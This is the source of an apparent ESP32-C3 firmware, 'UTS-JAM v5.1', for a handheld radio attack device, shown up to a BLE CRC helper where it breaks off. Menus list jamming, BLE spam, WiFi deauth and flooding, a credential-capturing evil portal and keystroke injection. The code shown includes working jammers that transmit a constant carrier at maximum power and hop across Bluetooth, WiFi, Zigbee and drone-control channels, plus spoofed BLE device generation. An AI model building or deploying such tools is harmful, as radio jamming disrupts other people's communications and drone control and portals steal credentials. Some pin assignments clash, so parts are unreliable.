/**************************************************************
 * UTS-JAM v5.1 ULTIMATE – ESP32-C3 FULL PACK
 * Educational use only. Use only on your own hardware.
 *
 * Build: ESP32C3 Dev Module / 4MB no spiffs / PSRAM off
 * Libs: RF24 (TMRh20), Adafruit SSD1306 + GFX, U8g2_for_Adafruit_GFX
 **************************************************************/

#include "RF24.h"
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <BLEAdvertisedDevice.h>
#include <BLEClient.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEUtils.h>
#include <DNSServer.h>
#include <Preferences.h>
#include <SPI.h>
#include <U8g2_for_Adafruit_GFX.h>
#include <WebServer.h>
#include <WiFi.h>
#include <Wire.h>
#include <esp_system.h>
#include <esp_wifi.h>
#include <esp_task_wdt.h>
#include <math.h>
#include <vector>
#include <map>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "soc/rtc_cntl_reg.h"
#include "soc/soc.h"

// ============================================================
// PIN DEFINITIONS
// ============================================================
#define SDA_PIN 8
#define SCL_PIN 9
#define SCREEN_WIDTH  128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define SSD1306_I2C_ADDRESS 0x3C

#define LED_PIN 10
#define UP_BUTTON_PIN 2
#define DOWN_BUTTON_PIN 0
#define SELECT_BUTTON_PIN 1

#define SPI_SCK  4
#define SPI_MISO 5
#define SPI_MOSI 6
#define RADIO1_CE  20
#define RADIO1_CSN 21
#define RADIO2_CE  7
#define RADIO2_CSN 10

// ============================================================
// OBJECTS
// ============================================================
SPIClass spiBus(FSPI);
RF24 radio(RADIO1_CE, RADIO1_CSN, 4000000);
RF24 radio2(RADIO2_CE, RADIO2_CSN, 4000000);

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
U8G2_FOR_ADAFRUIT_GFX u8g2_for_adafruit_gfx;

DNSServer dnsServer;
WiFiServer webServer(80);
String capturedCredentials = "";

bool radio1Active = false;
bool radio2Active = false;

Preferences prefs;
uint8_t brightness = 255;
bool stealthMode = false;

// ============================================================
// APP STATE
// ============================================================
enum AppState {
  STATE_MENU,
  STATE_SUBMENU_JAMMERS, STATE_SUBMENU_ANALYZERS, STATE_SUBMENU_ATTACKS,
  STATE_SUBMENU_TOOLS, STATE_SUBMENU_GAMES, STATE_SUBMENU_SETTINGS,
  STATE_SETTINGS, STATE_HELP,
  STATE_BT_JAM, STATE_DRONE_JAM, STATE_WIFI_JAM, STATE_MULTI_JAM,
  STATE_SWEEP_JAM, STATE_CHANNEL_RANGE, STATE_CW_JAMMER, STATE_ZIGBEE_JAM,
  STATE_BLE_TARGET_JAM, STATE_CUSTOM_HOPPER, STATE_NOISE_GEN,
  STATE_SPECTRUM_WIFI, STATE_SPECTRUM_BLE, STATE_RF_ANALYZER,
  STATE_WIFI_ANALYZER, STATE_PACKET_COUNTER, STATE_WIFI_SNIFFER, STATE_SIGNAL_METER,
  STATE_BLE_SPAM, STATE_APPLE_JUICE, STATE_SWIFT_PAIR, STATE_FAST_PAIR,
  STATE_RICKROLL_BEACON, STATE_BLE_BADUSB,
  STATE_WIFI_DEAUTH, STATE_WIFI_BEACON_FLOOD, STATE_PROBE_FLOOD, STATE_EVIL_PORTAL,
  STATE_ROGUE_AP_DETECT, STATE_NRF24_INJECTOR, STATE_DEAUTH_DETECT, STATE_WIDS,
  STATE_BLE_SCANNER, STATE_BLE_GATT_EXPLORER, STATE_BLE_TRACKER, STATE_MOUSE_SNIFFER,
  STATE_RF_REPEATER, STATE_RF_REPLAY, STATE_RF_OSCILLOSCOPE,
  STATE_TEST_RADIOS, STATE_SYSTEM_INFO,
  STATE_DOOM_GAME, STATE_DINO_GAME, STATE_FLAPPY_GAME, STATE_SNAKE_GAME,
  STATE_TICTACTOE, STATE_PONG, STATE_HUNT_GAME, STATE_SIMON_GAME,
  STATE_MEMORY_GAME, STATE_INVADERS,
  STATE_CALCULATOR, STATE_RESISTOR_CALC, STATE_WIFI_MONITOR,
  STATE_CLI, STATE_WEB_DASHBOARD, STATE_DUCKY_INJECTOR, STATE_LOCK
};
AppState currentState = STATE_MENU;

// ============================================================
// ICONS
// ============================================================
static const uint8_t PROGMEM icon_bt[]       = {0x00,0x46,0x6e,0x3e,0x1c,0x3e,0x6e,0x46};
static const uint8_t PROGMEM icon_drone[]    = {0x18,0x3c,0x5a,0xff,0x7e,0x3c,0x24,0x24};
static const uint8_t PROGMEM icon_wifi[]     = {0x00,0x3e,0x41,0x1c,0x22,0x08,0x14,0x00};
static const uint8_t PROGMEM icon_multi[]    = {0x55,0xaa,0x55,0xaa,0x55,0xaa,0x55,0xaa};
static const uint8_t PROGMEM icon_sweep[]    = {0x00,0x02,0x06,0x8e,0xfe,0x7e,0x30,0x00};
static const uint8_t PROGMEM icon_chrange[]  = {0x00,0x7e,0x42,0x5a,0x5a,0x42,0x7e,0x00};
static const uint8_t PROGMEM icon_spectrum[] = {0x18,0x18,0x24,0x24,0x42,0x5a,0x99,0x00};
static const uint8_t PROGMEM icon_ble_spec[] = {0x00,0x08,0x2a,0x1c,0x1c,0x2a,0x08,0x00};
static const uint8_t PROGMEM icon_spam[]     = {0x00,0x7e,0x46,0x4a,0x52,0x62,0x7e,0x00};
static const uint8_t PROGMEM icon_deauth[]   = {0x00,0x5e,0x62,0x5e,0x70,0x40,0x7e,0x00};
static const uint8_t PROGMEM icon_scanner[]  = {0x00,0x3c,0x5a,0x5a,0x66,0x42,0x3c,0x00};
static const uint8_t PROGMEM icon_zigbee[]   = {0x18,0x24,0x5a,0xdb,0x5a,0x24,0x18,0x00};
static const uint8_t PROGMEM icon_target[]   = {0x18,0x24,0x42,0x5a,0x42,0x24,0x18,0x00};
static const uint8_t PROGMEM icon_beacon[]   = {0x10,0x10,0x38,0x38,0x7c,0x7c,0xfe,0xfe};
static const uint8_t PROGMEM icon_analyzer[] = {0x00,0x1c,0x22,0x22,0x1c,0x08,0x3e,0x00};
static const uint8_t PROGMEM icon_detect[]   = {0x00,0x3c,0x5e,0xff,0xff,0x5e,0x3c,0x00};
static const uint8_t PROGMEM icon_radio[]    = {0x00,0x3c,0x42,0x99,0xa5,0x81,0x7e,0x00};
static const uint8_t PROGMEM icon_settings[] = {0x18,0x3c,0x5a,0xff,0x5a,0x3c,0x18,0x00};
static const uint8_t PROGMEM icon_help[]     = {0x3c,0x42,0x42,0x4c,0x48,0x00,0x18,0x00};
static const uint8_t PROGMEM icon_portal[]   = {0x3c,0x42,0x99,0xa5,0xa5,0x99,0x42,0x3c};
static const uint8_t PROGMEM icon_doom[]     = {0x00,0x7e,0x5a,0xdb,0xdb,0x5a,0x7e,0x00};
static const uint8_t PROGMEM icon_calc[]     = {0x7e,0x40,0x5e,0x52,0x52,0x5e,0x00,0x00};
static const uint8_t PROGMEM icon_resistor[] = {0x08,0x7f,0x08,0x3e,0x41,0x00,0x7f,0x00};
static const uint8_t PROGMEM icon_monitor[]  = {0x7c,0x44,0x28,0x10,0x28,0x44,0x7c,0x00};
static const uint8_t PROGMEM icon_snake[]    = {0x00,0x3c,0x42,0x52,0x4a,0x3c,0x00,0x00};
static const uint8_t PROGMEM icon_packet[]   = {0x7e,0x42,0x5a,0x5a,0x42,0x7e,0x00,0x00};
static const uint8_t PROGMEM icon_wids[]     = {0x3c,0x42,0x5a,0x5a,0x5a,0x42,0x3c,0x00};
static const uint8_t PROGMEM icon_rf_ana[]   = {0x0e,0x11,0x20,0x40,0x20,0x11,0x0e,0x00};
static const uint8_t PROGMEM icon_gatt[]     = {0x3c,0x42,0x81,0xbd,0x81,0x42,0x3c,0x00};
static const uint8_t PROGMEM icon_tracker[]  = {0x18,0x3c,0x5a,0xff,0xdb,0x3c,0x18,0x00};
static const uint8_t PROGMEM icon_mouse[]    = {0x30,0x28,0x24,0x22,0x21,0x00,0x18,0x00};
static const uint8_t PROGMEM icon_repeater[] = {0x00,0x42,0x66,0x3c,0x3c,0x66,0x42,0x00};
static const uint8_t PROGMEM icon_oscillo[]  = {0x00,0x44,0x28,0x10,0x28,0x44,0x00,0x00};
static const uint8_t PROGMEM icon_badusb[]   = {0x3c,0x42,0x5a,0x5a,0x42,0x3c,0x18,0x18};
static const uint8_t PROGMEM icon_sniffer[]  = {0x7e,0x42,0x5a,0x5a,0x42,0x7e,0x18,0x18};
static const uint8_t PROGMEM icon_cw[]       = {0x18,0x18,0x18,0xff,0xff,0x18,0x18,0x18};
static const uint8_t PROGMEM icon_tictactoe[]= {0x00,0x7e,0x42,0x5a,0x5a,0x42,0x7e,0x00};
static const uint8_t PROGMEM icon_pong[]     = {0x18,0x18,0x7e,0x7e,0x7e,0x18,0x18,0x00};
static const uint8_t PROGMEM icon_probe[]    = {0x10,0x38,0x7c,0x38,0x10,0x00,0x10,0x00};
static const uint8_t PROGMEM icon_hopper[]   = {0x08,0x1c,0x3e,0x7f,0x3e,0x1c,0x08,0x00};
static const uint8_t PROGMEM icon_noise[]    = {0x55,0x00,0xaa,0x00,0x55,0x00,0xaa,0x00};
static const uint8_t PROGMEM icon_signal[]   = {0x00,0x10,0x10,0x28,0x28,0x44,0x44,0x00};
static const uint8_t PROGMEM icon_system[]   = {0x7e,0x42,0x5a,0x5a,0x42,0x7e,0x00,0x00};
static const uint8_t PROGMEM icon_lock[]     = {0x3c,0x42,0x5a,0x5a,0x42,0x3c,0x18,0x18};
static const uint8_t PROGMEM icon_wumpus[]   = {0x3c,0x42,0x99,0xa5,0x81,0x42,0x3c,0x00};
static const uint8_t PROGMEM icon_simon[]    = {0x18,0x3c,0x5a,0xff,0x5a,0x3c,0x18,0x00};
static const uint8_t PROGMEM icon_memory[]   = {0x00,0x7e,0x42,0x5a,0x5a,0x42,0x7e,0x00};
static const uint8_t PROGMEM icon_invaders[] = {0x18,0x3c,0x7e,0xdb,0x7e,0x3c,0x18,0x00};
static const uint8_t PROGMEM icon_dino[]     = {0x07,0x0f,0x0e,0x1f,0x3f,0x2e,0x2c,0x00};
static const uint8_t PROGMEM icon_flappy[]   = {0x1c,0x3e,0x7f,0x6b,0x7f,0x3e,0x1c,0x00};
static const uint8_t PROGMEM icon_cli[]      = {0x00,0x7e,0x42,0x5a,0x42,0x7e,0x00,0x00};
static const uint8_t PROGMEM icon_web[]      = {0x00,0x3e,0x41,0x5d,0x41,0x3e,0x00,0x00};

// ============================================================
// MAIN MENU
// ============================================================
enum MainMenuItem {
  MENU_JAMMERS, MENU_ANALYZERS, MENU_ATTACKS, MENU_TOOLS,
  MENU_GAMES, MENU_SETTINGS, MENU_HELP, MENU_CLI, MENU_LOCK,
  NUM_MAIN_ITEMS
};
const char *mainMenuLabels[NUM_MAIN_ITEMS] = {
  "Jammers", "Analyzers", "Attacks", "Tools",
  "Games", "Settings", "Help", "CLI", "Lock"
};
const uint8_t *const mainMenuIcons[NUM_MAIN_ITEMS] PROGMEM = {
  icon_multi, icon_spectrum, icon_deauth, icon_scanner,
  icon_doom, icon_settings, icon_help, icon_cli, icon_lock
};
int firstVisibleMain = 0;
MainMenuItem selectedMain = MENU_JAMMERS;

// ============================================================
// SUBMENUS
// ============================================================
struct SubMenuItem { const char *label; const uint8_t *icon; AppState targetState; };
struct SubMenu { const char *title; std::vector<SubMenuItem> items; };

SubMenu subJammers = { "Jammers", {
  {"BT Jam",    icon_bt,      STATE_BT_JAM},
  {"DroneJam",  icon_drone,   STATE_DRONE_JAM},
  {"WiFiJam",   icon_wifi,    STATE_WIFI_JAM},
  {"MultiJam",  icon_multi,   STATE_MULTI_JAM},
  {"SweepJam",  icon_sweep,   STATE_SWEEP_JAM},
  {"ChRange",   icon_chrange, STATE_CHANNEL_RANGE},
  {"CW Jammer", icon_cw,      STATE_CW_JAMMER},
  {"ZigbeeJam", icon_zigbee,  STATE_ZIGBEE_JAM},
  {"TargJam",   icon_target,  STATE_BLE_TARGET_JAM},
  {"Hopper",    icon_hopper,  STATE_CUSTOM_HOPPER},
  {"NoiseGen",  icon_noise,   STATE_NOISE_GEN},
  {"Back",      icon_system,  STATE_MENU}
}};

SubMenu subAnalyzers = { "Analyzers", {
  {"WiFiSpec",  icon_spectrum, STATE_SPECTRUM_WIFI},
  {"BLESpec",   icon_ble_spec, STATE_SPECTRUM_BLE},
  {"RFAnalyz",  icon_rf_ana,   STATE_RF_ANALYZER},
  {"WiFiAnaly", icon_analyzer, STATE_WIFI_ANALYZER},
  {"PktCount",  icon_packet,   STATE_PACKET_COUNTER},
  {"WiFiSnif",  icon_sniffer,  STATE_WIFI_SNIFFER},
  {"SigMeter",  icon_signal,   STATE_SIGNAL_METER},
  {"Back",      icon_system,   STATE_MENU}
}};

SubMenu subAttacks = { "Attacks", {
  {"BLESpam",   icon_spam,     STATE_BLE_SPAM},
  {"SourApple", icon_spam,     STATE_APPLE_JUICE},
  {"SwiftPair", icon_badusb,   STATE_SWIFT_PAIR},
  {"FastPair",  icon_spam,     STATE_FAST_PAIR},
  {"Rickroll",  icon_beacon,   STATE_RICKROLL_BEACON},
  {"BLEBadUSB", icon_badusb,   STATE_BLE_BADUSB},
  {"Deauth",    icon_deauth,   STATE_WIFI_DEAUTH},
  {"Beacon",    icon_beacon,   STATE_WIFI_BEACON_FLOOD},
  {"ProbeFld",  icon_probe,    STATE_PROBE_FLOOD},
  {"EvilPort",  icon_portal,   STATE_EVIL_PORTAL},
  {"Back",      icon_system,   STATE_MENU}
}};

SubMenu subTools = { "Tools", {
  {"BLEScan",   icon_scanner,  STATE_BLE_SCANNER},
  {"BLE GATT",  icon_gatt,     STATE_BLE_GATT_EXPLORER},
  {"BLETrack",  icon_tracker,  STATE_BLE_TRACKER},
  {"MouseSnf",  icon_mouse,    STATE_MOUSE_SNIFFER},
  {"Repeater",  icon_repeater, STATE_RF_REPEATER},
  {"RF Replay", icon_repeater, STATE_RF_REPLAY},
  {"DuckyInj",  icon_badusb,   STATE_DUCKY_INJECTOR},
  {"Oscillosc", icon_oscillo,  STATE_RF_OSCILLOSCOPE},
  {"RogueAPD",  icon_detect,   STATE_ROGUE_AP_DETECT},
  {"NRF24Inj",  icon_radio,    STATE_NRF24_INJECTOR},
  {"DeauthDet", icon_detect,   STATE_DEAUTH_DETECT},
  {"WIDS",      icon_wids,     STATE_WIDS},
  {"WebDash",   icon_web,      STATE_WEB_DASHBOARD},
  {"TestRadio", icon_radio,    STATE_TEST_RADIOS},
  {"SysInfo",   icon_system,   STATE_SYSTEM_INFO},
  {"Back",      icon_system,   STATE_MENU}
}};

SubMenu subGames = { "Games", {
  {"DOOM 3D",   icon_doom,     STATE_DOOM_GAME},
  {"Dino Run",  icon_dino,     STATE_DINO_GAME},
  {"FlappyBird",icon_flappy,   STATE_FLAPPY_GAME},
  {"Snake",     icon_snake,    STATE_SNAKE_GAME},
  {"TicTacToe", icon_tictactoe,STATE_TICTACTOE},
  {"Pong",      icon_pong,     STATE_PONG},
  {"Hunt",      icon_wumpus,   STATE_HUNT_GAME},
  {"Simon",     icon_simon,    STATE_SIMON_GAME},
  {"Memory",    icon_memory,   STATE_MEMORY_GAME},
  {"Invaders",  icon_invaders, STATE_INVADERS},
  {"Back",      icon_system,   STATE_MENU}
}};

SubMenu subSettings = { "Settings", {
  {"Brightness", icon_settings, STATE_SETTINGS},
  {"Calc",       icon_calc,     STATE_CALCULATOR},
  {"Resistor",   icon_resistor, STATE_RESISTOR_CALC},
  {"WiFiMon",    icon_monitor,  STATE_WIFI_MONITOR},
  {"Sys Info",   icon_system,   STATE_SYSTEM_INFO},
  {"Reset WiFi", icon_radio,    STATE_TEST_RADIOS},
  {"Back",       icon_system,   STATE_MENU}
}};

SubMenu *currentSubMenu = nullptr;
int subFirstVisible = 0;
int subSelectedIndex = 0;

// ============================================================
// FORWARD DECLARATIONS (kritik - Arduino prototipleri bunları kaçırabilir)
// ============================================================
void executeState(AppState st);
void drawMainMenu();
void drawSubMenu();
void handleMainMenu();
void handleSubMenu();
void initRadios();
void stopRadios();
void recoverFromWiFi();
void setBrightness(uint8_t val);
void safeDelay(unsigned long ms);
void displayInfo(String t, String a = "", String b = "", String c = "");
void drawHeader(const char *title);
void drawHeader(const String &title);

// ============================================================
// BUTTON HANDLING (independent edge detection)
// ============================================================
bool lastUp = HIGH, lastDown = HIGH, lastSel = HIGH;
unsigned long lastBtnTime = 0;

bool upPressed() {
  bool cur = digitalRead(UP_BUTTON_PIN);
  if (lastUp && !cur && (millis() - lastBtnTime > 60)) {
    lastUp = cur; lastBtnTime = millis();
    if (!stealthMode) digitalWrite(LED_PIN, HIGH);
    return true;
  }
  if (cur) lastUp = HIGH;
  return false;
}
bool downPressed() {
  bool cur = digitalRead(DOWN_BUTTON_PIN);
  if (lastDown && !cur && (millis() - lastBtnTime > 60)) {
    lastDown = cur; lastBtnTime = millis();
    if (!stealthMode) digitalWrite(LED_PIN, HIGH);
    return true;
  }
  if (cur) lastDown = HIGH;
  return false;
}
bool selPressed() {
  bool cur = digitalRead(SELECT_BUTTON_PIN);
  if (lastSel && !cur && (millis() - lastBtnTime > 60)) {
    lastSel = cur; lastBtnTime = millis();
    if (!stealthMode) digitalWrite(LED_PIN, HIGH);
    return true;
  }
  if (cur) { lastSel = HIGH; if (!stealthMode) digitalWrite(LED_PIN, LOW); }
  return false;
}

// ============================================================
// HELPERS
// ============================================================
void safeDelay(unsigned long ms) {
  unsigned long start = millis();
  while (millis() - start < ms) {
    esp_task_wdt_reset();
    yield();
  }
}

void setBrightness(uint8_t val) {
  brightness = val;
  display.ssd1306_command(SSD1306_SETCONTRAST);
  display.ssd1306_command(brightness);
}

void displayInfo(String t, String a, String b, String c) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);  display.println(t);
  if (a != "") { display.setCursor(0, 14); display.println(a); }
  if (b != "") { display.setCursor(0, 28); display.println(b); }
  if (c != "") { display.setCursor(0, 42); display.println(c); }
  display.display();
}

void drawHeader(const char *title) {
  display.fillRect(0, 0, SCREEN_WIDTH, 10, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setTextSize(1);
  display.setCursor(2, 1);
  display.print(title);
  display.setTextColor(SSD1306_WHITE);
}
// String overload - bu hata #1'i çözer
void drawHeader(const String &title) {
  drawHeader(title.c_str());
}

void drawScrollbar(int sel, int total, int top, int h) {
  if (total <= 4) return;
  int barH = max(3, h * 4 / total);
  int barY = top + (h - barH) * sel / max(1, total - 1);
  display.fillRect(SCREEN_WIDTH - 2, top, 2, h, SSD1306_BLACK);
  display.drawFastVLine(SCREEN_WIDTH - 1, top, h, SSD1306_WHITE);
  display.fillRect(SCREEN_WIDTH - 2, barY, 2, barH, SSD1306_WHITE);
}

// ============================================================
// SPLASH
// ============================================================
static const unsigned char PROGMEM splash_evi[] = {
  0x30,0x03,0x00,0x60,0x01,0x80,0xe0,0x01,0xc0,0xf3,0xf3,0xc0,
  0xff,0xff,0xc0,0xff,0xff,0xc0,0x7f,0xff,0x80,0x7f,0xff,0x80,
  0x7f,0xff,0x80,0xef,0xfd,0xc0,0xe7,0xf9,0xc0,0xe3,0xf1,0xc0,
  0xe1,0xe1,0xc0,0xf1,0xe3,0xc0,0xff,0xff,0xc0,0x7f,0xff,0x80,
  0x7b,0xf7,0x80,0x3d,0x2f,0x00,0x1e,0x1e,0x00,0x0f,0xfc,0x00,
  0x03,0xf0,0x00
};
static const unsigned char PROGMEM splash_ble[] = {
  0x07,0xc0,0x1f,0xf0,0x3e,0xf8,0x7e,0x7c,0x76,0xbc,0xfa,0xde,
  0xfc,0xbe,0xfe,0x7e,0xfc,0xbe,0xfa,0xde,0x76,0xbc,0x7e,0x7c,
  0x3e,0xf8,0x1f,0xf0,0x07,0xc0
};
static const unsigned char PROGMEM splash_mhz[] = {
  0xc3,0x61,0x80,0x00,0xe7,0x61,0x80,0x00,0xff,0x61,0x80,0x00,
  0xff,0x61,0xbf,0x80,0xdb,0x7f,0xbf,0x80,0xdb,0x7f,0x83,0x00,
  0xdb,0x61,0x86,0x00,0xc3,0x61,0x8c,0x00,0xc3,0x61,0x98,0x00,
  0xc3,0x61,0xbf,0x80,0xc3,0x61,0xbf,0x80
};

void splashScreen() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_adventurer_tr);
  display.drawBitmap(52, 22, splash_evi, 18, 21, 1);
  u8g2_for_adafruit_gfx.setCursor(20, 10);
  u8g2_for_adafruit_gfx.print("2.4 G H Z");
  u8g2_for_adafruit_gfx.setCursor(28, 24);
  u8g2_for_adafruit_gfx.print("UTS-JAM");
  u8g2_for_adafruit_gfx.setCursor(30, 44);
  u8g2_for_adafruit_gfx.print("v5.1 ULT");
  display.drawBitmap(104, 12, splash_ble, 15, 15, 1);
  display.drawBitmap(2, 24, splash_mhz, 25, 11, 1);
  display.display();
}

// ============================================================
// RADIO INIT / STOP
// ============================================================
void initRadios() {
  radio.stopConstCarrier();
  radio2.stopConstCarrier();
  safeDelay(100);
  spiBus.end();
  spiBus.begin(SPI_SCK, SPI_MISO, SPI_MOSI);
  safeDelay(200);

  display.clearDisplay();
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);

  bool r1ok = false;
  for (int i = 0; i < 6; i++) {
    if (radio.begin(&spiBus)) { r1ok = true; break; }
    safeDelay(200);
  }
  if (r1ok) {
    radio1Active = true;
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.startConstCarrier(RF24_PA_MAX, 45);
    display.println("Radio1: OK");
  } else {
    radio1Active = false;
    display.println("Radio1: FAIL");
  }

  bool r2ok = false;
  for (int i = 0; i < 6; i++) {
    if (radio2.begin(&spiBus)) { r2ok = true; break; }
    safeDelay(200);
  }
  if (r2ok) {
    radio2Active = true;
    radio2.setAutoAck(false);
    radio2.stopListening();
    radio2.setRetries(0, 0);
    radio2.setPALevel(RF24_PA_MAX, true);
    radio2.setDataRate(RF24_2MBPS);
    radio2.setCRCLength(RF24_CRC_DISABLED);
    radio2.startConstCarrier(RF24_PA_MAX, 45);
    display.println("Radio2: OK");
  } else {
    radio2Active = false;
    display.println("Radio2: FAIL");
  }
  display.display();
  safeDelay(900);
}

void stopRadios() {
  radio.stopConstCarrier();
  radio2.stopConstCarrier();
  radio.stopListening();
  radio2.stopListening();
}

void recoverFromWiFi() {
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
  esp_wifi_stop();
  esp_wifi_deinit();
  safeDelay(600);
  initRadios();
}

// ============================================================
// JAMMER FUNCTIONS
// ============================================================
void btJam() {
  if (radio1Active) radio.setChannel(random(0, 81));
  if (radio2Active) radio2.setChannel(random(0, 81));
  delayMicroseconds(random(30, 120));
}
void droneJam() {
  if (radio1Active) radio.setChannel(random(0, 126));
  if (radio2Active) radio2.setChannel(random(0, 126));
  delayMicroseconds(random(30, 120));
}
void wifiJam() {
  const int ch[] = {1, 6, 11, 14};
  int r = random(0, 4);
  if (radio1Active) radio.setChannel(ch[r]);
  if (radio2Active) radio2.setChannel(ch[r]);
  delayMicroseconds(80);
}
void multiJam() {
  if (radio1Active) radio.setChannel(random(0, 15));
  if (radio2Active) radio2.setChannel(random(0, 81));
  delayMicroseconds(60);
}
void sweepJam() {
  for (int i = 0; i < 125; i++) {
    if (radio1Active) radio.setChannel(i);
    if (radio2Active) radio2.setChannel(i);
    delayMicroseconds(180);
  }
}
void channelRangeJam(int lo, int hi) {
  int r = random(lo, hi + 1);
  if (radio1Active) radio.setChannel(r);
  if (radio2Active) radio2.setChannel(r);
  delayMicroseconds(100);
}
void cwJammer(int ch) {
  if (radio1Active) { radio.setChannel(ch); radio.startConstCarrier(RF24_PA_MAX, ch); }
  if (radio2Active) { radio2.setChannel(ch); radio2.startConstCarrier(RF24_PA_MAX, ch); }
}
void zigbeeJam() {
  int ch = random(11, 27);
  int nrf = 5 + (ch - 11) * 5;
  if (radio1Active) radio.setChannel(nrf);
  if (radio2Active) radio2.setChannel(nrf);
  delayMicroseconds(random(50, 150));
}
void noiseGen() {
  static uint8_t buf[32];
  for (int i = 0; i < 32; i++) buf[i] = random(256);
  if (radio1Active) radio.writeFast(buf, 32);
  if (radio2Active) radio2.writeFast(buf, 32);
}

// ============================================================
// WATERFALL
// ============================================================
void shiftWaterfall(uint8_t *wf, int w, int h) {
  for (int y = 0; y < h - 1; y++)
    for (int x = 0; x < w; x++) {
      bool bit = (wf[(y + 1) * 16 + x / 8] >> (x % 8)) & 1;
      if (bit) wf[y * 16 + x / 8] |= (1 << (x % 8));
      else     wf[y * 16 + x / 8] &= ~(1 << (x % 8));
    }
  for (int x = 0; x < w; x++) wf[(h - 1) * 16 + x / 8] &= ~(1 << (x % 8));
}

void drawWaterfall(uint8_t *wf, int w, int h, const char *ll, const char *rl) {
  display.clearDisplay();
  display.drawBitmap(0, 0, wf, w, h, SSD1306_WHITE);
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, h + 2); display.print(ll);
  display.setCursor(90, h + 2); display.print(rl);
  display.display();
}

// ============================================================
// SPECTRUM ANALYZERS
// ============================================================
void runWiFiSpectrum() {
  stopRadios();
  if (radio2Active) {
    radio2.setAutoAck(false);
    radio2.setChannel(2);
    radio2.startListening();
  }
  uint8_t wf[128 * 4] = {0};
  const int w = 128, h = 30;
  int nrfCh[13];
  for (int i = 0; i < 13; i++) nrfCh[i] = 12 + i * 5;
  displayInfo("WiFi Spectrum", "SEL to exit");
  while (!selPressed()) {
    shiftWaterfall(wf, w, h);
    for (int i = 0; i < 13; i++) {
      if (!radio2Active) break;
      radio2.setChannel(nrfCh[i]);
      delayMicroseconds(120);
      int hits = 0;
      for (int s = 0; s < 4; s++) { if (radio2.testRPD()) hits++; delayMicroseconds(60); }
      int barH = map(hits, 0, 4, 0, h - 1);
      int x = map(i, 0, 12, 2, w - 3);
      for (int py = h - barH; py < h; py++) wf[py * 16 + x / 8] |= (1 << (x % 8));
      yield();
    }
    drawWaterfall(wf, w, h, "WiFi 1-13", "");
    safeDelay(30);
  }
  if (radio2Active) radio2.stopListening();
  initRadios();
}

void runBLESpectrum() {
  stopRadios();
  if (radio2Active) {
    radio2.setAutoAck(false);
    radio2.setChannel(2);
    radio2.startListening();
  }
  uint8_t wf[128 * 4] = {0};
  const int w = 128, h = 30;
  const int bleCh[3] = {2, 26, 80};
  displayInfo("BLE Spectrum", "SEL to exit");
  while (!selPressed()) {
    shiftWaterfall(wf, w, h);
    for (int i = 0; i < 3; i++) {
      if (!radio2Active) break;
      radio2.setChannel(bleCh[i]);
      delayMicroseconds(150);
      int hits = 0;
      for (int s = 0; s < 6; s++) { if (radio2.testRPD()) hits++; delayMicroseconds(60); }
      int barH = map(hits, 0, 6, 0, h - 1);
      int x = map(i, 0, 2, 22, 108);
      for (int py = h - barH; py < h; py++) wf[py * 16 + x / 8] |= (1 << (x % 8));
      yield();
    }
    drawWaterfall(wf, w, h, "BLE 37-39", "");
    safeDelay(40);
  }
  if (radio2Active) radio2.stopListening();
  initRadios();
}

void runRFAnalyzer() {
  initRadios();
  if (radio2Active) {
    radio2.stopConstCarrier();
    radio2.setAutoAck(false);
    radio2.setChannel(45);
    radio2.startListening();
  }
  const int w = 128, h = 30;
  uint8_t wf[128 * 4] = {0};
  displayInfo("RF Analyzer", "SEL to exit");
  while (!selPressed()) {
    shiftWaterfall(wf, w, h);
    if (radio1Active) {
      for (int ch = 0; ch < 80; ch++) {
        radio.setChannel(ch);
        delayMicroseconds(100);
        if (radio.testRPD()) {
          int x = map(ch, 0, 79, 0, w - 1);
          wf[(h - 1) * 16 + x / 8] |= (1 << (x % 8));
        }
        yield();
      }
    }
    float noise = 0;
    if (radio2Active) {
      for (int i = 0; i < 40; i++) { if (radio2.testRPD()) noise += 1; delayMicroseconds(40); }
    }
    display.clearDisplay();
    display.drawBitmap(0, 0, wf, w, h, SSD1306_WHITE);
    display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, h + 2); display.print("2.40 N:"); display.print(noise / 40.0, 1);
    display.setCursor(96, h + 2); display.print("2.48");
    display.display();
    safeDelay(20);
  }
  if (radio2Active) radio2.stopListening();
  initRadios();
}

// ============================================================
// BLE SPAM
// ============================================================
static const uint8_t bleAA[4] = {0xD6, 0xBE, 0x89, 0x8E};
static uint8_t blePkt[40];
static const char* blePre[] = {
  "AirPods","JBL","Sony","Samsung","Xiaomi","Beats","Bose","Anker","Jabra",
  "Sennheiser","Marshall","Apple","Huawei","OnePlus","Nothing","Google","LG",
  "Motorola","Nokia","Realme","Redmi","Oppo","Vivo","Philips","Panasonic",
  "Skullcandy","JVC","Audio-Technica","Shure","Bang & Olufsen"
};
static const char* bleSuf[] = {
  " Pro"," Lite"," Max"," 2"," 3"," Mini",""," Plus"," Ultra",
  " ANC"," TWS"," Sport"," Buds"," Gen2"," Gen3"," LE"," 4"," 5"," X"," Neo"
};

void bleRandomMac(uint8_t* mac) {
  for (int i = 0; i < 6; i++) mac[i] = random(256);
  mac[0] |= 0xC0;
}
void bleRandomName(uint8_t* name, int maxLen) {
  const char* pre = blePre[random(30)];
  const char* suf = bleSuf[random(20)];
  int pl = strlen(pre), sl = strlen(suf);
  int total = pl + sl; if (total > maxLen) total = maxLen;
  memcpy(name, pre, pl); memcpy(name + pl, suf, sl);
  name[total] = 0;
}
uint32_t bleCrc(const uint8_t* data, int len, uint32_t crc) {
  for (int i = 0; i < len; i++) {
    crc ^= data[i];
    for (int j = 0; j < 8; j++) {
      if (crc & 1) crc = (crc >> 1) ^ 0x8C;
      else crc >>= 1;
    }
  }
  return crc;
}
